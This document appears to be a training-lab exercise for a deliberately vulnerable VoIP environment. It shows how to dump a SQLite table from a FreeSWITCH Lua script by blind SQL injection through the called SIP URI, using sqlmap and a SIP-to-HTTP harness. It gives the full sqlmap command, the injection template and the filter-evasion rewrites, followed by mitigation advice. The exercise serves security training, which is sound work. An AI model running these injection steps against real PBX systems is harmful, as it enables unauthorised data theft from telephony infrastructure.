# Exercise 10: Automated FreeSWITCH Lua SQLite Exfiltration with sqlmap

## Goal

Use `sip-sqlmap-harness` and `sqlmap` to extract the full `did_routes` table from the intentionally vulnerable FreeSWITCH Lua SQLite query on extension `2001`, without writing any SQL by hand.

## Prerequisites

- DVRTC running: `./scripts/compose.sh --scenario pbx2 up -d`
- The `testing` service, which ships `sqlmap` and `sip-sqlmap-harness`

## Steps

### Step 1: Open an interactive testing shell

Run on the host:

```bash
./scripts/compose.sh --scenario pbx2 run --rm testing sh
```

### Step 2: Start the SIP SQLi harness

In the testing shell, run the harness in the background:

```bash
sip-sqlmap-harness --mode pbx2 --host 127.0.0.1 --listen-port 17772 --timeout 8 &
```

The harness bridges `sqlmap` (which speaks HTTP) to the FreeSWITCH SIP injection point. It listens on `http://127.0.0.1:17772/`, takes each query-string value from `sqlmap`, embeds it in the called SIP URI of an `INVITE` to extension `2001`, sends that through OpenSIPS to FreeSWITCH, and returns `TRUE` or `FALSE` depending on the SIP response. It also tears down each established dialog so the oracle stays stable over many probes.

### Step 3: Dump the did_routes table

In the testing shell:

```bash
sqlmap -u "http://127.0.0.1:17772/?q=1" -p q \
  --string=TRUE --batch \
  --dbms=SQLite --technique=B \
  --tamper=between \
  -T did_routes --dump
```

Flag summary:

| Flag | Purpose |
|------|---------|
| `-u` | URL of the harness oracle |
| `-p q` | inject through the `q` parameter |
| `--string=TRUE` | treat HTTP responses containing `TRUE` as boolean-true |
| `--batch` | accept all defaults without prompting |
| `--dbms=SQLite` | skip DB fingerprinting |
| `--technique=B` | use blind boolean-based inference only |
| `--tamper=between` | rewrite `>` as `NOT BETWEEN … AND …` to avoid characters that break SIP URIs |
| `-T did_routes --dump` | target the `did_routes` table |

`sqlmap` extracts the DID → target/scope mapping used by the Lua script row by row, including the hidden internal-only `9000/internal` entry.

### Step 4: Stop the harness

```bash
kill %1
exit
```

## What's happening

The injection point here is the *called number* itself. The FreeSWITCH Lua script concatenates the user part of the called SIP URI directly into a SQLite `SELECT` against `did_routes`. The harness wraps each boolean check from `sqlmap` in a called URI of the form:

```text
2001'/**/AND/**/((<expression>))/**/AND/**/'1'='1
```

`<expression>` comes from `sqlmap`'s blind boolean inference. The `between` tamper rewrites `>` as `NOT BETWEEN … AND …`, and the harness rewrites whitespace as `/**/` and comparison operators like `!=`/`<>` as `IS NOT` before embedding the payload in the SIP URI.

When the expression is TRUE, FreeSWITCH resolves the route and answers with `200 OK`. When it is FALSE, the query returns no rows and the call ends as `480`. The harness maps `200` → `TRUE` and `480` → `FALSE` in the HTTP response body, which is what `sqlmap --string=TRUE` looks for.

## Mitigation

- Replace `freeswitch.Dbh` with `lsqlite3` for application databases. `lsqlite3` supports `db:prepare()` and `stmt:bind_values()` for real parameter binding. `freeswitch.Dbh` has no parameterized queries or escape function; `luasql-sqlite3` offers `conn:escape()` but only string-level escaping.
- Restrict which routes the Lua layer may resolve to, independent of DB content
- Do not rely on destination filtering alone to protect internal-only services
